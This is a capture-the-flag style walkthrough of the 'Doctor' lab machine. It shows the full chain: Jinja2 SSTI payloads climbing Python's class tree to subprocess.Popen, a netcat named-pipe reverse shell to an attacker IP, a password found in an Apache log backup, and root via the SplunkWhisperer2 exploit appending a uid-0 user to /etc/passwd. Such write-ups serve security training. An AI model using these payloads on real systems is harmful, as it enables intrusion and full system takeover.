# Doctor

### Basic Information
**Machine name:** Doctor  
**IP:** 10.10.10.209  
**Written by:** Adir Biran  
**Tools:** Nmap, Gobuster    
**Method:** 


## Enumeration


#### Nmap
<p align="center">
  *1
</p>

Open Ports:  
22 - SSH  
80 - HTTP  
8089 - HTTPS  

#### Gobuster

Gobuster - Port 80  
<p align="center">
  *2
</p>

Endpoints found:  
 

Gobuster - Port 8089  
<p align="center">
*3
</p>

Endpoints found:  



the website
*4

info@doctors.htb
nothing else useful

add doctors.htb to hosts
*5

gobuster on doctors.htb
*6

the website on 8089
*7
the service installed is splunk 8.0.5 and requires username and password which we don't have.
at this point searched for exploits and default credentials, but nothing worked.

/robots.txt
*7-1

we will get back to splunk later when we find the credentials.

doctors.htb
*8
leads to a login page

/archive leads to a blank page, but viewing the source code
*8-2

tried basic sql injection but all trials failed.

registered a new account
*9

that stays active for 20 minutes, after that we will have to create another one.
*10

tried posting a new message and test for xss and ssti
*11

however, looks like the code isn't injected.

kept trying different syntaxes based on PayloadAllTheThings repository:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

after enumerating and looking back at /archive

even though the page is blank, when looking again at the source code, we can see the website is vulnerable to ssti attack as the input (7+7) was rendered by the template engine.
*12

found this article about SSTI on jinja2/flask
https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee

there are multiple methods found to achieve the RCE easily, but we will do it manually.
started climbing the tree, by entering the following commands into the template, and reading the results from /archive.

{{"".__class__}}
*13
{{"".__class__.__mro__}}
*14
{{"".__class__.__mro__[1]}}
*15
{{"".__class__.__mro__[1].__subclasses__()}}
*16

the input we received from this stage, contains all the modules that are imported.
in order to execute code on the machine, we need to locate the correct module and function.

first, we'll copy the whole line to a file and remove the begining and tailing tags (<title>,<item>).
*17

as we can see its a long list with html entities:
&lt; represents "lower than" <
*gt; represents "greater than" >
&#39; represents '

we will use sed to find and replaces all occurences of the html entities.
sed 's/&lt;/</g'
replace all &lt; occurrences with <

replace all the "&gt;" occurrences with >
sed 's/&gt;/>/g'

replace all "&#39;" occurences with '
sed "s/&#39;/'/g"

replacing all the commas with new lines
sed "s/, /\n/g"

combining the 4 together
cat results | sed 's/&gt;/>/g' | sed 's/&lt;/</g' | sed "s/&#39;/'/g" | sed "s/, /\n/g" | grep subprocess
*18

now that we have a beautiful list, let's look for subprocess module.
cat results | sed 's/&gt;/>/g' | sed 's/&lt;/</g' | sed "s/&#39;/'/g" | sed "s/, /\n/g" | grep subprocess
*19

good, now let's get the line number of subprocess.Popen using grep with -n tag.
*20

subprocess.Popen is at line 408.
However we need to substract 1 from the line number we got because the indexes do not align.

so the next command to inject into the template engine will be:
{{"".__class__.__mro__[1].__subclasses__()[407]}}
*21

we will try to execute 'whoami' as a POC:
{{"".__class__.__mro__[1].__subclasses__()[407]('whoami', shell=True, stdout=-1).communicate()}}
*22

we can see that it runs as "web".

to get a reverse shell, we'll just replace the command with the following payload:

tried a few syntaxes of nc reverse shell payloads but only this on worked:
rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 1234 >/tmp/f

so lets open nc on port 1234 and inject the following command:
{{"".__class__.__mro__[1].__subclasses__()[407]('rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 1234 >/tmp/f', shell=True, stdout=-1).communicate()}}
*23

and we're in as web.

other users on the machine:
*23-2

web is part of the adm group
*24

meaning, we can read log files that located in /var/log.
*25

after checking several log files, got a hit on a backup file located in /var/log/apache2:
using cat backup | grep pass
*26

password found: Guitar123

tried login to the other users
*27
splunk failed but shaun succeed with Guitar123 as the password.

after checking several methods to escalate to root (that failed), decided to try those credentials on the website on port 8089 from earlier.
*28

it worked.

searched on google what can be exploited with splunk credentials.
found this repository
https://github.com/cnotin/SplunkWhisperer2.git
and gave it a try

cloned the repository
*29

running the remote python script indicates the parameters needed.
*30

so the command will be:
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.6 --username shaun --password Guitar123 --payload 'whoami'
*31

however, we don't get results from the exploit even though it seems to work.
let's try another way to get POC that it works, by creating a file on the remote machine on /tmp directory:
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.6 --username shaun --password Guitar123 --payload 'touch /tmp/test'
*32

and on the remote machine while on shaun user, check the /tmp directory:
*33

we can see that the file was created by root.

we will escalate the privileges by adding an entry to the /etc/passwd file.
on the local machine, create a password for the new user to be added:
perl -le 'print crypt("pass", "anything")'
*34

the line that needs to be added is to the passwd file is:
root2:an5CaYOk82Zq6:0:0:root2:/root:/bin/bash

so the final command is:
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.6 --username shaun --password Guitar123 --payload 'echo "root2:an5CaYOk82Zq6:0:0:root2:/root:/bin/bash" >> /etc/passwd'
*35

checking on the victim's machine that the entry was added successfuly
*36

and switching to root2 with "pass" as password that created previously.
*37

and we're root.
